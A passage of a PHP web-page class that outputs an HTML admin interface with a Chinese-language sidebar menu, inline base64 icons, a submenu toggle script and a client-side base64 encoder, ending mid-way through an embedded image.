                            <img src="data:image/png;base64,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"
                                alt="">
                            <span>在线访谈</span>
                        </a></li>
                    <li>
                        <a href="?action=sjcx">
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgEAYAAAAj6qa3AAAABGdBTUEAALGPC/xhBQAAAAFzUkdCAK7OHOkAAAAgY0hSTQAAeiYAAICEAAD6AAAAgOgAAHUwAADqYAAAOpgAABdwnLpRPAAAAAZiS0dEAAAAAAAA+UO7fwAAAAlwSFlzAAAASAAAAEgARslrPgAAAg5JREFUaN7tmL9r6lAUx895PH+FWOrQQqsi1E5Clhu7Cd0KhW5CoP+Cg5ODgzgp4ujk/5C1g+Bi3HRIpjYdaqdu0h9ECreI9LyhtKW1rbyXwOXh/Ww555Lv93wJ4d4LIJFI1hlctYAN2IANbm6wghWspFJ+BWlIQxqenzuqozqqpr3pmMxkpmVhG9vYPjz0rdOhDnXu78OZcCacSaVG6VF6lOb8LwNA1HVd1/XnZ7+GPuJ5tm3btr25+RYAZ5zx62ssYAELe3uBSREQ0NaW7diO7dzefm7/Cnaw/w8ZgGgDopEBiDYgGhmAaAOiWfsAfv/cJqIGNahxcYFTnOJ0d9evIKmkknp5CUUoQvG9jk1sYtN1oQxlKCcSvnUMMsh4eIhH49F49PEREHD1vleyfqz8KPSaXtNrZ2fAgQPf2fErSFnKUvbqyik5Jad0evpaZxM2YZNuF7vYxe7Bge/JQhCCkOdxxhlnx8eu4RquMZ9/XrbiH4AIPehB7+TEt6HXN1poobW/v9RIQhKSR0dggQVWcIehWD/Wj/U3Nl6e5GFoCRmAaAOikQGINiAaGYBoA6KRAfzcJqIxjWk8mwUr63lLpQUsYPFF/V/JQx7y8zmv8iqvPj19t2zlVljTNE3TEolIK9KKtAI4pdWpTvW7u5dr6veBc2bOzJmqqiiKoijb28HozGbfXYdLJBIAAPgD0OTBdY0MpfsAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTktMTAtMjJUMjI6NTA6MDMrMDg6MDDm0Hw7AAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE5LTEwLTIyVDIyOjUwOjAzKzA4OjAwl43EhwAAAFB0RVh0c3ZnOmJhc2UtdXJpAGZpbGU6Ly8vaG9tZS9hZG1pbi9pY29uLWZvbnQvdG1wL2ljb25faWVsa3E0bTFnZGkvY2hhbmdjaWd1YW5saS5zdmcS9qHGAAAAAElFTkSuQmCC"
                                alt="">
                            <span>数据查询</span>
                        </a>
                    </li>

                    <li>
                        <a href="javascript:;" class="havanexta">
                            <img src="data:image/png;base64,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"
                                alt="">
                            <span>便民服务</span>
                        </a>
                        <ul class="sen-nav">
                            <li><a href="?action=flyj">法律依据</a></li>
                            <li><a href="?action=bszn">办事指南</a></li>
                            <li><a href="?action=yjzj">意见征集</a></li>
                        </ul>
                    </li>
                    <li><a id="more" href="javascript:;" class="havanexta" data-rel="more">
                            <img src="data:image/png;base64,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"
                                alt="">
                            <span>招标投标</span>
                        </a>
                        <ul class="sen-nav">
                            <li><a href="?action=bsjs">标书检索</a></li>
                            <li><a href="?action=sxxc">思想宣传</a></li>
                            <li><a href="?action=bsxz">标书下载</a></li>
                            <li><a href="?action=zxsb">在线申报</a></li>
                        </ul>
                    </li>
                    <li><a href="?action=logout">
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAD9UlEQVRYR8WXXWhcVRDH/3MJSUFIoBAEqYJp8EHbhz1zlhgrmIANCC0Uv0BFFIUG9EFrHxR9aH2o+GKgDyqNqKCCYOsHqC+WYvGDNeTOuUts82IqFq1SUXEJEptk78hZ793ubnZzd5stGbhskp2P35kzd2ZC2GShTY6PDQEw89sAxsrl8nixWPzpSg6zUQD1QVX1Refc4asCwMwDAJ5LnuMicn8aiJnXADDzlwCGALwsIq9nQa2bAWZ+MAm8M3F0VkR2ZAD8CWBrovN5AvJNK5CWANbaA6o6VWN4Io7jQ1EUzWcAeNjPANyQ6sVxfEcURV81g2gKYK29V1WPJwbnVfWIc+6NRgfNrqAG7ll/+uT3c0EQTMzOzv7Y6GMNQD6fz8dx7FM3COBXVb3LOTfXjH49AK/PzPcB+CCxPVkqlfYuLCxcqvW1BsAYc4KI7gGwBGCfiHzR6v6yABohmr0tdQC5XM4GQTCbBHxSRF5br4rbAUggngDwqs8oACsiv6V+6wCMMVNEdMAr9vb27iwUCn91A2B0dHTr8vLy9wCua8xCFWB4eLhvYGDgPIBrAUyJyMGsd7jdDCRZeAXAM/5wpVJpKK2FKgAzbwew4JWJ6PYwDL/tJoC1dpeqVvpBuVy+qVgs/lCJlQax1o6pqu9iXgZF5I9uAuRyucEgCH73PuM4vjOKolONAA+r6jsALojItqzgSVo7mgXMfCGpg8ecc36QXc6AMeYwER0CcFpExq8SgM+wz3R1eFWvwBizn4iOATgnIsNtAvhTTJTL5V3tjGNm9jW2XVUnnXPTjRnYQ0SfArgkIlvaAehUh5n/BdCnqnudc35eXL6CkZGRbaurqz83FkmnQVrpG2PuJqIPk7fgxjRjdY2ImUPfwlX1Lefc490KnhTsewAeAnBGRNLxXr+S1XRCv+VY55x0A8IYw0TkD+flqIg8nfqty4C1doeqfgfgGiKaDsNwshsA1tpjqrofwD9EdGsYhmeaAvg/WmuPqOrz/ueN7HppAGbeB+DjSsERvRSG4Qu1h1ozjsfGxrYsLi76dN2SGI2HYXj6SjJhjHmUiCoNB8DJpaWlPfPz88vrAvgvc7nczUEQnK1RPCgitetZJk9NY6vo9vT0XD8zM/NLo2HLnTCfzw/Fcfy1b52JkajqdF9f37uFQsEvK2vET9T+/v5HiMjfNycKf8dxvDuKorQI6+yytuIBVX0z2ZBSQ78jfKSqvq9XhYj8CudXMP+ZyicrKyuTc3NzlSHUTNr6x8Ra+4CqPgVgJDP3/yvMENHRMAzfz9JvCyB1wswTAHar6m1E5BcX/3i5qKoXfaEBOOWc81fXlnQE0JbHDpU2HeA/6fgHPx8CONAAAAAASUVORK5CYII="
                                alt="">
                            <span>退出登录</span>
                        </a></li>
                </ul>
            </nav>
        </div>
        <div class="right">
            <div>
                $content
            </div>
        </div>
    </div>
    <script>
        var item = document.getElementsByClassName('havanexta');
        console.log(item)
        for(var i = 0;i<item.length;i++){
            (function(j){
                item[j].onclick = function () {
                var nextul = item[j].nextElementSibling;
                    console.log(nextul.style.height)
                if(nextul.style.height =='0px'||nextul.style.height==''){
                    nextul.style.height = (j+2)*60 + 'px'
                }else{
                    nextul.style.height = '0px';
                }
            };
            })(i)
        }
    </script>
</body>

</html>
EOF;

		self::htmlOut($main_html);
	}

	public function htmlBase64Js () {
		self::htmlOut("<script>function base64encode(str){var base64EncodeChars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";var out, i, len;var c1, c2, c3;len = str.length;i = 0;out = \"\";while (i < len) {c1 = str.charCodeAt(i++) & 0xff;if (i == len) {out += base64EncodeChars.charAt(c1 >> 2);out += base64EncodeChars.charAt((c1 & 0x3) << 4);out += \"==\";break;}c2 = str.charCodeAt(i++);if (i == len) {out += base64EncodeChars.charAt(c1 >> 2);out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));out += base64EncodeChars.charAt((c2 & 0xF) << 2);out += \"=\";break;}c3 = str.charCodeAt(i++);out += base64EncodeChars.charAt(c1 >> 2);out += base64EncodeChars.charAt(((c1 & 0x3) << 4) | ((c2 & 0xF0) >> 4));out += base64EncodeChars.charAt(((c2 & 0xF) << 2) | ((c3 & 0xC0) >> 6));out += base64EncodeChars.charAt(c3 & 0x3F);}return out;}</script>");
	}

	public function htmlDefault () {
		self::htmlMain('<div style="text-align: right"><img src="data:image/png;base64,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